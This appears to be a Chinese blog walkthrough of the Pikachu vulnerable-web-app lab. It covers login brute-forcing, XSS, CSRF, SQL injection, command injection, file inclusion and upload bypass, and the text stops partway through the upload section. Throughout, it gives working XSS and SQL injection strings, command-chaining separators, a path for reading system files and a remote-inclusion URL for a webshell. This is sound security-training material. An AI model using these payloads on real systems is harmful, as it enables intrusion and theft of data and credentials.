#  pikachu漏洞靶场通关手册（万字图文解析）   
原创 BlankSec  泷羽Sec-Blanks   2025-01-17 15:25  
  
# pikachu漏洞靶场通关  
  
靶场链接文末获取  
- 一、密码爆破  
- 1.1 基于表单的暴力破解  
- 1.2 验证码绕过（on server）  
- 1.3 验证码绕过（on client）  
- 1.4 token防爆破  
- 二、Cross-Site Scripting(XSS)  
- 2.1 反射型xss(get)  
- 2.2 反射型XSS（post）  
- 2.3 存储型XSS  
- 2.4 DOM型XSS  
- 2.5 DOM型XSS-X  
- 2.6 XSS之盲打  
- 2.7 XSS之过滤  
- 2.8  XSS之htmlspecialchars  
- 2.9 XSS之href输出  
- 2.10 XSS之js输出  
- 三、CSRF  
- 3.1 CSRF(get)  
- 3.2 CSRF(post)  
- 3.3 CSRF Token  
- 四、SQL-Inject(SQL注入)  
- 4.1 数字型注入(post)  
- 4.2 字符型注入(get)  
- 4.3 搜索型注入  
- 4.4 xx型注入  
- 4.5 "insert/update"注入  
- 4.6 "delete"注入  
- 4.7 "http header"注入  
- 4.8 盲注(布尔判断)  
- 4.9 盲注(延时判断)  
- 4.10 宽字节注入  
- 五、RCE(命令执行)  
- 5.1 ping  
- 5.2 eval  
- 六、File Inclusion(文件包含)  
- 6.1 File Inclusion(local)  
- 6.2 File Inclusion(remote)  
- 七、Unsafe Filedownload（非安全文件下载）  
- 7.1 Unsafe Filedownload  
- 八、Unsafe Fileupload（非安全文件上传）  
- 8.1 client check（客户端检测）  
- 8.2 MIME type（MIME文件类型）  
- 8.3 getimagesize(获取图片信息函数)  
- 九、Over Permission(越权)  
- 9.1 水平越权  
- 9.2 垂直越权  
- 十、目录遍历  
- 10.1 目录遍历漏洞  
- 十一、敏感信息泄露  
- 11.1 IcanseeyouABC  
- 十二、XXE  
- 12.1 XXE漏洞(xml外部实体注入)  
- 十三、URL重定向  
- 13.1 URL跳转  
- 十四、SSRF  
- 14.1 SSRF(curl)  
- 14.2 SSRF(file_get_content)  
- pikachu靶场：  
- 文章精选  
- 学习交流群  
## 一、密码爆破  
### 1.1 基于表单的暴力破解  
> ❝  
> 使用burp抓包  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5IZsDqfQ73QE4I5Uibztg6WGTMgyq4d8wXsZibIg4jJcXjbb7l2jb35Z0VwY5SFlhpKJwlwJCXPicz2abf8kRh4uw/640?wx_fmt=png&from=appmsg "")  
> ❝  
> 丢到Intruder模块并将包中自带参数删除  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5IZsDqfQ73QE4I5Uibztg6WGTMgyq4d8wxkTRMgxiccRdCBTrbWETI43a6vZgsje5oeyVQhbPMH46IfKK5qCibwTw/640?wx_fmt=png&from=appmsg "")  
> ❝  
> 将账号和密码两个加上参数并选择Cluster bomb模块  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5IZsDqfQ73QE4I5Uibztg6WGTMgyq4d8w71xjVlYZBSdzlhON6HX8kw7K2JsheZIeJtnXUoUWuvEC4icV6jeYxFg/640?wx_fmt=png&from=appmsg "")  
> ❝  
> 选择第一个参数表（账号），并且在下方添加爆破参数  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5IZsDqfQ73QE4I5Uibztg6WGTMgyq4d8wZm6Btep9GibUbSb5xv0IPNJBicPaMotMGp2ZPOXAC7ibJ5y3AGC9LU2jw/640?wx_fmt=png&from=appmsg "")  
> ❝  
> 选择第二个参数表（密码）导入弱密码字典,完成点击start attack开始爆破  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5IZsDqfQ73QE4I5Uibztg6WGTMgyq4d8wjoyP2k6OHGC8R0wlibRg2gpKPIGm0D8ic1VTtq9TkZvbPNjxYbtq89lA/640?wx_fmt=png&from=appmsg "")  
> ❝  
> 点击Length进行长度排序，该长度是Response响应报文的长度，登录成功和登录失败肯定返回的响应不同，根据这个原理进行判断，直接找返回长度不同的即可  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5IZsDqfQ73QE4I5Uibztg6WGTMgyq4d8wdnjsVF6qwRQZLM5I922Hlz3uegKAOIdDpvjwKnwmhmpnXMu53HVktQ/640?wx_fmt=png&from=appmsg "")  
> ❝  
> 最终得到三组账号密码  
  
  
admin 123456  
  
test abc123  
  
pikachu 000000  
### 1.2 验证码绕过（on server）  
> ❝  
> 首先输入错误的账号密码，然后抓包放到Reperter里（可以Ctrl+r快捷键），点几次发送，会发现一直显示的是账号和密码错误  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5IZsDqfQ73QE4I5Uibztg6WGTMgyq4d8wdo5CN1pfk3TLibTVtp8HmXVxfTjC3vyYhG2boDqny4eLUgvMMdcPkjw/640?wx_fmt=png&from=appmsg "")  
> ❝  
> 之后将账号密码改为正确的，再发送，会发现显示登录成功  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5IZsDqfQ73QE4I5Uibztg6WGTMgyq4d8wfO11Eiad5ose7AsddNUEvOCBRUHbn958fGkY5LWJqSe2St96nQs43sg/640?wx_fmt=png&from=appmsg "")  
> ❝  
> 由此可知，登录时的验证码是不会失效的，所以就拿着正确的验证码，同1.1直接去密码爆破就行  
  
### 1.3 验证码绕过（on client）  
> ❝  
> 同样的，输入抓包看Response  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5IZsDqfQ73QE4I5Uibztg6WGTMgyq4d8w5VZDhpCZTMFE46ibsy3RcGrVsBCOlGvCNg9zDNPSgbMCRMyJNrXyodw/640?wx_fmt=png&from=appmsg "")  
> ❝  
> 因为全是中文所以一眼就看到了，可以知道该登录验证码验证是js代码放在前端的，我们都知道前端是在客户端的（可控），所以我们直接将包中有验证码的参数删了。  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5IZsDqfQ73QE4I5Uibztg6WGTMgyq4d8wsmsibQ87Ll1DfGdPYL1Bys24UIxjibLX7F4LVuaOGZtlfsxianX5ianPCQ/640?wx_fmt=png&from=appmsg "")  
> ❝  
> 没有验证码参数也就不会进行验证，直接拿去爆破.  
  
### 1.4 token防爆破  
> ❝  
> 抓包，有token连发两次会报错，删掉token还是不行，但是我们注意到右框中奖token值回显在HTML前端属性中，这个时候我们就可以配置一个正则重定向，让BP在每次爆破的时候自动爬取这个token值，并带入进行爆破  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5IZsDqfQ73QE4I5Uibztg6WGTMgyq4d8wGrfC5w3O3PxPSDu0ClAtutB9CPIYCu98w3RocV3dgZNySZ724f6icIA/640?wx_fmt=png&from=appmsg "")  
> ❝  
> 先改变量，对密码和token两个变量进行爆破,并将Attack type模式改为Pitchfork草叉模式  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5IZsDqfQ73QE4I5Uibztg6WGTMgyq4d8wx1iac6ubNMI6icXBrcRCPXCclkZjOasYMxXnGlokydyyyibWueTJr6tGg/640?wx_fmt=png&from=appmsg "")  
> ❝  
> 密码就正常添加字典，然后到tooken配置页面，Payload type改为Recursive grep。  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5IZsDqfQ73QE4I5Uibztg6WGTMgyq4d8wXpDF2wyB6ZiaAp9JfibibvolqiaQLTTsLrh4wW42XeSoK4mFzHtvl1tWVA/640?wx_fmt=png&from=appmsg "")  
> ❝  
> 然后来到Options中的Grep-Extact配置重定向  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5IZsDqfQ73QE4I5Uibztg6WGTMgyq4d8wjI6EJsMbLG8tqyVNbfMDkpzhq9VS7BowvmU0TBdLteDDc69oPMKPwQ/640?wx_fmt=png&from=appmsg "")  
> ❝  
> 点击Fetch response 获取相应  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5IZsDqfQ73QE4I5Uibztg6WGTMgyq4d8wNlypNaibL3AR9dTohicwVnJergCDiaBFp21eJBiaqiaLVzhSN3BcQz09hLw/640?wx_fmt=png&from=appmsg "")  
> ❝  
> 然后直接将token值标出来就行，系统会自己填写正则表达式  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5IZsDqfQ73QE4I5Uibztg6WGTMgyq4d8wvibCH5tMmf3LAPhExXiaAz2eqAOZ2BuicPNvNha2klYXku15dDDjzNyPw/640?wx_fmt=png&from=appmsg "")  
> ❝  
> 最后调低一下线程，改为1，最后直接爆破  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5IZsDqfQ73QE4I5Uibztg6WGTMgyq4d8w5AbdkJ1btmmFKu9ibFf3UibBibLkYESTnlNhNJTBBbsboWtnfuO8MibyRg/640?wx_fmt=png&from=appmsg "")  
> ❝  
> 最后得到结果  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5IZsDqfQ73QE4I5Uibztg6WGTMgyq4d8wuZky3k4gI14aYN13R7FBgChyhx118nic2icSzhdCdM8xz2f9ZE3ibKCTA/640?wx_fmt=png&from=appmsg "")  
## 二、Cross-Site Scripting(XSS)  
### 2.1 反射型xss(get)  
> ❝  
> xss口令：见框就插 基本检测语句：<script>alert("XSS")</script>  
输入进去会发现  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5IZsDqfQ73QE4I5Uibztg6WGTMgyq4d8waZT3EVwYcP4B9Cf1bhkVpmoFcJJqHhibiaQRPYwVHHS9Z8ETN3L2SPzg/640?wx_fmt=png&from=appmsg "")  
  
=  
> ❝  
> 存在最大输入长度限制（一般都是前端的操作）  
  
  
方法一:**修改前端**  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5IZsDqfQ73QE4I5Uibztg6WGTMgyq4d8w7Qc0m8ic7xEZxVdR1MyL5xjIH8ibb9LhBV75dgsJlwCY5SxG4YRTOh0w/640?wx_fmt=png&from=appmsg "")  
> ❝  
> 将maxlength值修改，然后输入<script>alert("XSS")</script>  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5IZsDqfQ73QE4I5Uibztg6WGTMgyq4d8wia10EbTplSkF5M8mbWj3jicsQarOYUGoFgn2nD1HBgDYXEgW2BZoBjng/640?wx_fmt=png&from=appmsg "")  
  
方法二:**URL中输入**  
> ❝  
> 观察URL，我们输入的参数与URL中的message参数绑定  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5IZsDqfQ73QE4I5Uibztg6WGTMgyq4d8wGJmuFBxstEicTWXm9HMRanzliaH1HkKT1zicMu8IctEnI1Of6icpMY1Nog/640?wx_fmt=png&from=appmsg "")  
> ❝  
> 将<script>alert("XSS")</script>  
输入到URL中。  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5IZsDqfQ73QE4I5Uibztg6WGTMgyq4d8wf86hD8LDKHC5EB5QRAWk8hZyBc4AdvE35wDYic6C3sZlq9soP82ttSw/640?wx_fmt=png&from=appmsg "")  
> ❝  
> 这样就能在不修改前端的情况下完成XSS  
  
### 2.2 反射型XSS（post）  
> ❝  
> 尝试输入，发现在下方存在数据回显  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5IZsDqfQ73QE4I5Uibztg6WGTMgyq4d8wBLhSrtTghnv0qE1Yr7yd7O3qaqm0aeGxiakjw988ynmSfElZOJGL1wg/640?wx_fmt=png&from=appmsg "")  
> ❝  
> 直接在框内插入<script>alert("XSS")</script>  
得到提示框  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5IZsDqfQ73QE4I5Uibztg6WGTMgyq4d8wjNAvIWK1hJ3epTiaWL0cbWxPfflWSR44BVPbg6hvEYgjf8GAg1EWlDw/640?wx_fmt=png&from=appmsg "")  
### 2.3 存储型XSS  
  
存储型与反射性的区别就是，反射型是一次性的，而存储型是存在数据库中的，每请求一次就会触发一次  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5IZsDqfQ73QE4I5Uibztg6WGTMgyq4d8w4n2xJuSxjiaog703Q2TG49UjLp2AVCibAZdyokcUMMgQTibxACTDy6Tsg/640?wx_fmt=png&from=appmsg "")  
> ❝  
> 留言列表不删除，每刷新一次就会触发一次  
  
### 2.4 DOM型XSS  
  
DOM型就是将XSS输入到标签属性中了，利用属性进行触发  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5IZsDqfQ73QE4I5Uibztg6WGTMgyq4d8wCcl7iaXSfBLR1xViaSTykUlCqA5EoJX8pGia36lWWSpIZPcWKVUC9ad5Q/640?wx_fmt=png&from=appmsg "")  
> ❝  
> 我们可以看到输入的内容显示在a标签的href属性中，当我们点击超链接what do you see?时就会触发标签内容 输入命令 javascript:alert(23)  
之后点击超链接就会触发XSS  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5IZsDqfQ73QE4I5Uibztg6WGTMgyq4d8wU748yx8FiasYy1xKbKhuibJPI18nMR6fEYbD0kS2yDwCek1npA3iabYmA/640?wx_fmt=png&from=appmsg "")  
### 2.5 DOM型XSS-X  
> ❝  
> 同上，区别就是点击两次进行触发  
  
### 2.6 XSS之盲打  
  
XSS盲打就是攻击者在进行XSS插入时不会在前端有回显，但是在后台可以看得到，当管理员进行后台登录时就会看到XSS的内容，如果存在这种漏洞危害性还是很大的，因为能直接盗取管理员的COOKIE拿到权限，但又十分隐蔽，只能进行尝试不能确保一定存在。  
> ❝  
> 进行语句插入，根据右上角提示查看插入效果  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5IZsDqfQ73QE4I5Uibztg6WGTMgyq4d8wTmVb3ibuGHSPCrXHA7bXj2DoCiavBF5ACnnVApbQI6O2ESnZP3SiayUsw/640?wx_fmt=png&from=appmsg "")  
### 2.7 XSS之过滤  
> ❝  
> 大小写混淆过滤,<scRipt>alert(14)</sCript>  
使用注释进行干扰: <sc<!--test--> ript> alert(14)</scr <--test--> ipt>  
重写: <scri<script> pt> alert(14)</scri</script> pt>  
使用img标签<img src=xss onerror="alert(11)">  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5IZsDqfQ73QE4I5Uibztg6WGTMgyq4d8wONnawIJvXbGpOW9QX8kOlz9biaqrGiaGKZz1eGb6EnvOT554qemoPdPg/640?wx_fmt=png&from=appmsg "")  
### 2.8  XSS之htmlspecialchars  
> ❝  
> 先输入一个字符，发现会回显一个超链接，直接插入javascript:alert("XSS")  
,点击超链接出现框框 htmlspecialchars()函数把预定义的字符转换为HTML实体 &(和号)成为& "(双引号)成为" '(单引号)成为' <(小于)成为< ‘>’(大于)成为>  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5IZsDqfQ73QE4I5Uibztg6WGTMgyq4d8wBP3iaLTyXjg3n8N4hEInZ2nMCz4RFPia1Qrfg5I7gaSFyXHtvnctBiaLQ/640?wx_fmt=png&from=appmsg "")  
### 2.9 XSS之href输出  
  
同上![](https://mmbiz.qpic.cn/mmbiz_png/5IZsDqfQ73QE4I5Uibztg6WGTMgyq4d8wicSUCPHx759AADwrxmxWUS10RRpNExbFYcmefxhWibmg26GZrmU0Nt9w/640?wx_fmt=png&from=appmsg "")  
  
### 2.10 XSS之js输出  
> ❝  
> 根据提示，输入tmac  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5IZsDqfQ73QE4I5Uibztg6WGTMgyq4d8waqZgA2Q91BGoZCicUxyCNp8wdNw9r8WGy9t4bkJZ2HRpicicOVLpMmXdQ/640?wx_fmt=png&from=appmsg "")  
> ❝  
> 发现是字符连接，所以输入时候要先闭合再插入，tmac'</script><script>alert('xss')</script>  
最后得到框框  
  
## 三、CSRF  
### 3.1 CSRF(get)  
> ❝  
> 随便登入一个用户，然后修改抓包  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5IZsDqfQ73QE4I5Uibztg6WGTMgyq4d8wOgibEtFpguGCSEAOMbxnDcFWDtibMVfufoDSrCTibLK2gllbib4YDqa4Ww/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5IZsDqfQ73QE4I5Uibztg6WGTMgyq4d8wZYNawZBptZnI5Msichy67XU0TzLw9F7j5OQhO9IVq7woH2bC8dDY1UQ/640?wx_fmt=png&from=appmsg "")  
> ❝  
> 得到URL192.168.3.245/pikachu-master/vul/csrf/csrfget/csrf_get_edit.php?sex=2&phonenum=2&add=2&email=2&submit=submit  
，观察数据包session还是自己的，但是当用别的用户登录时再打开这个URL就会执行同样的修改操作,我们发现kobe账号的信息已经被修改,在URL中提交参数是GET请求方法  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5IZsDqfQ73QE4I5Uibztg6WGTMgyq4d8wTsW7KbR6MRWrSZNYKicutUNFpOyaU6DibdYTtmxUPX8UibF1rq8bs2Rpw/640?wx_fmt=png&from=appmsg "")  
### 3.2 CSRF(post)  
> ❝  
> 在表单中提交参数使用的是POST请求方法，抓包，发现参数都在请求正文中，因为这些都在请求体中所以我们要自己搭一个恶意站点去构造URL，让vince去点击这个站点触发脚本进行执行。  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5IZsDqfQ73QE4I5Uibztg6WGTMgyq4d8wZxIddDdsHRoPZYiapV8V9QOPfPMbjKFohtF0R2wN66uicziboMWeiakYJg/640?wx_fmt=png&from=appmsg "")  
### 3.3 CSRF Token  
  
加了token之后，每一次请求服务端都会给用户发送一个随机码来预防CSRF请求伪造。  
> ❝  
> 知道token的生成方法才有可能被利用（所以在做防护时生成token是要有足够的随机性）  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5IZsDqfQ73QE4I5Uibztg6WGTMgyq4d8whykX5gJ2icvEpqPRViaEvVCcf97GInicuBoKvz1qJbFz1SfibQhEIatgUw/640?wx_fmt=png&from=appmsg "")  
## 四、SQL-Inject(SQL注入)  
### 4.1 数字型注入(post)  
> ❝  
> 因为是选择框不能修改数据，所以直接抓包在bp中改数据  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5IZsDqfQ73QE4I5Uibztg6WGTMgyq4d8wjb0cj9DajibGnomA7gzKiar6atjMIOUOBEgh3Ptl1OSf7xjaCRmT7r4g/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5IZsDqfQ73QE4I5Uibztg6WGTMgyq4d8w2AUiaG8o22genVoQTzFblVSOKHxHEM6icdEOhsibezrPZ17Tvtw6fK3ibg/640?wx_fmt=png&from=appmsg "")  
> ❝  
> SQL注入中对于数字型注入不需要进行闭合，直接 and 1=1 和and 1=2 进行探测发现返回的响应页面不同（漏洞简单探测）  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5IZsDqfQ73QE4I5Uibztg6WGTMgyq4d8wtld0Q16J9Guic4QZ4wD36pZp12IJ42yvuA9fDMsXjdjo7cwBOlss7nQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5IZsDqfQ73QE4I5Uibztg6WGTMgyq4d8wtld0Q16J9Guic4QZ4wD36pZp12IJ42yvuA9fDMsXjdjo7cwBOlss7nQ/640?wx_fmt=png&from=appmsg "")  
> ❝  
> 开始注入首先利用order by 探测列表数，order by 3出错，order by 2正常，所以表单列数为2.  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5IZsDqfQ73QE4I5Uibztg6WGTMgyq4d8wdeH5D7cKnuw8yIXDp13P8icS7ZOOicNkUtCrs22rWjPPYmVrXE8k9SOQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5IZsDqfQ73QE4I5Uibztg6WGTMgyq4d8wDnLeQ0MuoNQkMmfnbUuqLiceXExkzOQLUZPtC2nRpPRSKG14FhwvDdQ/640?wx_fmt=png&from=appmsg "")  
> ❝  
> union 查询 id=2 union select user(),database()--+ 可以在后面加上注释符（习惯性加,不知道后面会写什么）  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5IZsDqfQ73QE4I5Uibztg6WGTMgyq4d8wUzVtWSFjf3nybZpKuZ4tr334KLZTF5V01RNa7DJymkNCfVPJdtYZhA/640?wx_fmt=png&from=appmsg "")  
### 4.2 字符型注入(get)  
> ❝  
> 直接在URL中注入就可以(GET请求方法)  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5IZsDqfQ73QE4I5Uibztg6WGTMgyq4d8wFIAMiaBeLF8XeZgMWs4Dicfg6FicK16iaRdMcRAtM50ePKOdJZqm8WCIYQ/640?wx_fmt=png&from=appmsg "")  
> ❝  
> 输入一个单引号 '  
 发现报错（简单漏洞探测）  并且有报错回显也可以进行报错注入  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5IZsDqfQ73QE4I5Uibztg6WGTMgyq4d8wtT3jproyBsDW2v9bYud9QZGd4rN9vbrNszbBOHaaU0EYr9wZm09uAQ/640?wx_fmt=png&from=appmsg "")  
> ❝  
> 然后后面加上--+注释符页面又会正常，接下来的注入流程和上面的一样先order by再union  
  
### 4.3 搜索型注入  
> ❝  
> 也是在url中字符型（get请求），注入方法同上  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5IZsDqfQ73QE4I5Uibztg6WGTMgyq4d8wSf4OvaTfKVbKicZ6Zib9a4uBTzwsS9mz8cEpaBN7jUV2bOSVZibFAfC5Q/640?wx_fmt=png&from=appmsg "")  
### 4.4 xx型注入  
> ❝  
> 同上  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5IZsDqfQ73QE4I5Uibztg6WGTMgyq4d8wK7aIJG2jA7cRu3m0FP7rdgTRdJ5sxib7AzMMxHhTG42lehJiat1tKs4A/640?wx_fmt=png&from=appmsg "")  
### 4.5 "insert/update"注入  
> ❝  
> insert:在用户位置输入 x' or updatexml(1,concat(0x7e,database()),0) or '  
进行注入，得到数据信息  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5IZsDqfQ73QE4I5Uibztg6WGTMgyq4d8wcrKnUiaD27wnVt1nX6ictR4iaXIlr5URcK9YiaIXf8x4nH5ic3ShHsia2fcg/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5IZsDqfQ73QE4I5Uibztg6WGTMgyq4d8wwVPy10V8iaSqu3SHuHflnfaR2xXHTarnls1iaVY4LUs07gVia0fB0Yiayg/640?wx_fmt=png&from=appmsg "")  
> ❝  
> update思路一样，闭合查询  
  
### 4.6 "delete"注入  
> ❝  
> 点击删除，抓包，在id位置进行注入 id=1+or+updatexml(1,concat(0x7e,database()),0)  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5IZsDqfQ73QE4I5Uibztg6WGTMgyq4d8wMLWvAJiborJlQlgGn1XiaG7XUXT5heiaSnPaeTUxQlYXW6LC0000KIS8g/640?wx_fmt=png&from=appmsg "")  
### 4.7 "http header"注入  
> ❝  
> 在COOKIE里进行注入，操作同上，只是位置不同，直接在bp中抓包修改即可 注入的方法都一样，类似的还有XFF注入  
  
### 4.8 盲注(布尔判断)  
  
**盲注，即无数据回显，不能看到返回的数据，需要利用其他方式判断（布尔 or 延时）**  
> ❝  
> 输入kobe' and 1=1#  
 数据正常显示，1=1为真，所以当and条件为真时数据就正常显示，反之无数据展示  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5IZsDqfQ73QE4I5Uibztg6WGTMgyq4d8wnXd4HiarSaJOuToCwtxibhicDJ4PXdO9wuT1nwovZtBunX9wMZt9rWqVg/640?wx_fmt=png&from=appmsg "")  
> ❝  
> 利用kobe' and substr(database(),1,1)='p'#  
 substr函数时对字符串进行截取，这里是截取从第一个字符开始长度为1的字符 我们知道数据库名字是pikachu 所以当输入这个条件时，会正常返回  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5IZsDqfQ73QE4I5Uibztg6WGTMgyq4d8w2YwBHUUlFHHfpibGUAukBhUNHuW3mNfujcuXY3wm49g1qKBjNYiaHdlg/640?wx_fmt=png&from=appmsg "")  
> ❝  
> 根据这个判断知道数据库第一个字符是p  
  
> ❝  
> 之后修改substr函数的参数向后依次进行判断  
  
> ❝  
> 有个关于盲注的便捷方法，就是使用bp设置两个参数变量，设置好字典让bp自己去跑.  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5IZsDqfQ73QE4I5Uibztg6WGTMgyq4d8w5VBq93lBJcZjA2BYx0tKoaibfPy19JqibliaKvKtFbrSCeCa7vAhcXThQ/640?wx_fmt=png&from=appmsg "")  
### 4.9 盲注(延时判断)  
> ❝  
> 延时判断就要用到sleep函数了，kobe' and sleep(3)#  
利用数据库的延时，进行正误的判断，会发现页面停顿3秒后才有回显 我们可以利用if函数if(条件,为真时执行的操作，为假时执行的操作)kobe' and if((substr(database(),1,1))='p',sleep(3),null)#  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5IZsDqfQ73QE4I5Uibztg6WGTMgyq4d8wCNicOrKu9zpyPcaDbBkuXXpuyRUftlOhibYPXDRxfzOZtUjONic1k74FA/640?wx_fmt=png&from=appmsg "")  
### 4.10 宽字节注入  
  
一般在防御SQL注入的时候都会开启gpc,来过滤特殊字符 数据库编码与PHP编码设置为不同的两个编码，那就可能产生宽字节注入  
> ❝  
> 输入kobe%df'+or+1=1#  
%df'==(数据库GBK)==運’原理：  
  \’+%df=運’        %df会消除反斜杠\ 变成一个可以实现闭合的字符  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5IZsDqfQ73QE4I5Uibztg6WGTMgyq4d8wp06hN8DficWvuTrNmdLh7JC8jTZ2hq4Bdto8OZ0wzEQ3R9hZ0grDZsQ/640?wx_fmt=png&from=appmsg "")  
## 五、RCE(命令执行)  
### 5.1 ping  
> ❝  
> 这里是直接拼接字符的，可以用其他特殊符号进行执行;  
（分号） 命令按照顺序（从左到右）被执行，并且可以用分号进行分隔。当有一条命令执 行失败时，不会中断其它命令的执行。|  
 (管道符号) 通过管理符 可以将一个命令的标准输出管理为另外一个命令的标准输入，当它 失败后，会执行另外一条命令&  
(后台任务符号) 命令按照顺序（从左到右）被执行，跟分号作用一样；此符号作用是后台任务符 号使shell 在后台执行该任务，这样用户就可以立即得到一个提示符并继续其他 工作&&  
（逻辑与） 前后的命令的执行存在逻辑与关系，只有【&&】前面的命令执行成功后，它后 面的命令才被执行||  
（逻辑或） 前后命令的执行存在逻辑或关系，只有【||】前面的命令执行失败后，它后面的 命令才被执行；  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5IZsDqfQ73QE4I5Uibztg6WGTMgyq4d8w9icZxp8qtmzfb2Xbia6DgfVUJa08nGqVYtjNtH0jYicaXh9yiaFeJSNPiaA/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5IZsDqfQ73QE4I5Uibztg6WGTMgyq4d8wZT36WVFEFSAwgyZu16zOZVOA5SwTShqroAicULD2gZ141YPtvyPvVQg/640?wx_fmt=png&from=appmsg "")  
### 5.2 eval  
  
eval是php远程命令执行的函数  
> ❝  
> 用法:phpinfo();  
直接查看php配置文件  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5IZsDqfQ73QE4I5Uibztg6WGTMgyq4d8wR0HPOoiaPVXqLNrjtQdqYFlYTv8ribzXg9N2HVy2FnV3SD9gvEnSh40g/640?wx_fmt=png&from=appmsg "")  
## 六、File Inclusion(文件包含)  
### 6.1 File Inclusion(local)  
  
本地文件包含可以将存于服务器本地的文件进行包含读取，如可以将服务器敏感文件进行包含读取  
> ❝  
> 如：将文件路径替换为..\..\..\..\..\..\windows\system32\drivers\etc\hosts  
可以进行读取  
  
### 6.2 File Inclusion(remote)  
  
远程文件包含，这个就允许其他客户端或者服务器的文件进行远程的包含了，危害极大可以直接上传SHELL，拿到web的权限。  
> ❝  
> 可以直接远程包含一个一句话木马拿shell<?php phpinfo();?>  
，将这个文件写在自己的机器上用远端进行文件读取，http://192.168.1.2/webshell.php  
  
## 七、Unsafe Filedownload（非安全文件下载）  
### 7.1 Unsafe Filedownload  
  
观察url，下载的文件是可以根据URL中的参数进行任意修改的，也就是说如果知道了项目路径，可以达到任意文件下载的目的当然有passwd、shadow但不限于此。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5IZsDqfQ73QE4I5Uibztg6WGTMgyq4d8wuJN6DnIgpf1qoR1HKOc9r37FvOlX56gSdgMWqU8EnTZfwPy8lw0Png/640?wx_fmt=png&from=appmsg "")  
## 八、Unsafe Fileupload（非安全文件上传）  
### 8.1 client check（客户端检测）  
  
上传一句话木马.php文件会直接弹窗  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5IZsDqfQ73QE4I5Uibztg6WGTMgyq4d8wb18GlIJibNalsVHx7YRp2oH1QjSFOBmUwAI3pRJ8UDcPQBQic9zzlE2w/640?wx_fmt=png&from=appmsg "")  
  
进行burp抓包的话发现并没有数据包说明，是在前端进行拦截并没有传到后端。  
> ❝  
> 方法一、直接将前端js代码删掉。 方法二、先将shell后门文件的文件扩展名改为允许上传的名字，然后进行转包，在bp中进行改包重发。  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5IZsDqfQ73QE4I5Uibztg6WGTMgyq4d8w100mLZ8iayO52zFNMFDm0F3SYTUv8gUQFubfFA4tQDwh6KsXyicULj5w/640?wx_fmt=png&from=appmsg "")  
  
改完后，再放包  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5IZsDqfQ73QE4I5Uibztg6WGTMgyq4d8w5iabtTh1C6qwC1l9cFBKOVBsOSknlygGY3br7z8nPFOPmcib6T84N14Q/640?wx_fmt=png&from=appmsg "")  
### 8.2 MIME type（MIME文件类型）  
  
抓包，直接修改数据包中的MIME文件类型，随后上传  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5IZsDqfQ73QE4I5Uibztg6WGTMgyq4d8weOCAOEC056JFvxtkogC74XdhOReyz7ld7g9KORiac3oR90Jx1NsSoiaQ/640?wx_fmt=png&from=appmsg "")  
### 8.3 getimagesize(获取图片信息函数)  
  
Getimagesize ( ) 返回文件大小和文件类型  
> ❝  
